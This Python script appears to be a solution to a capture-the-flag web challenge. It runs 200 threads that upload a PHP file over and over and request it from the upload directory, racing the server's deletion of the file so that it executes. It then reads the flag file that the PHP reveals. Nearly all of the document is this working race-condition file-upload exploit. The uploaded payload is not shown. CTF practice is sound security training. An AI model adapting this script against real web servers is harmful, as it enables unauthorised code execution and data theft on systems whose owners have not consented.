# not-so-tiny-file-thread.py
import requests
import threading

BASE_URL = "http://challs1.nusgreyhats.org:5207/"
FILE = "file.php"
THREADS = 200
LOOPS = 25

SESSION = requests.Session()
SESSION.get(BASE_URL)

# post thread class
class postThread(threading.Thread):
    def __init__(self, threadID):
        threading.Thread.__init__(self)
        self.threadID = str(threadID).zfill(3)

    def run(self):
        for _ in range(LOOPS):
            post_file(self.threadID)

# get thread class
class getThread(threading.Thread):
    def __init__(self, threadID):
        threading.Thread.__init__(self)
        self.threadID = str(threadID).zfill(3)

    def run(self):
        for _ in range(LOOPS):
            get_file(self.threadID)

# get file
def get_file(id):
    path = "upload/" + FILE
    # print(f"Thread #{id} GET  /{path}") # verbose
    site = SESSION.get(BASE_URL + path)
    content = site.text
    if 'Not Found' not in content and 'Fatal error' not in content:
        print("PAGE FOUND")
        print(f"upload/{content}")
        read_flag(content)

# post file
def post_file(id):
    # print(f"Thread #{id} POST /upload.php") # verbose
    file_map = {
        "upload_file": (FILE, open(FILE, "r"), "application/octet-stream"), 
        'submit': (None, 'trust_me_this_is_not_flag')
    }
    site = SESSION.post(BASE_URL + "upload.php", files=file_map)
    if site.status_code != 200:
        print("UPLOAD FAIL!")
        print(site.text)

# read flag file
def read_flag(flag_file):
    site = requests.get(BASE_URL + "upload/" + flag_file.strip())
    page = site.text
    print(page)

# main logic here
def main():
    # create new threads (alternating POST and GET threads)
    threads = list(map(
        lambda num: getThread(num) if (num % 2 == 1) else postThread(num), 
        list(range(THREADS))
    ))
    # start new threads
    for thread in threads:
        thread.start()

# driver code
if __name__ == "__main__":
    main()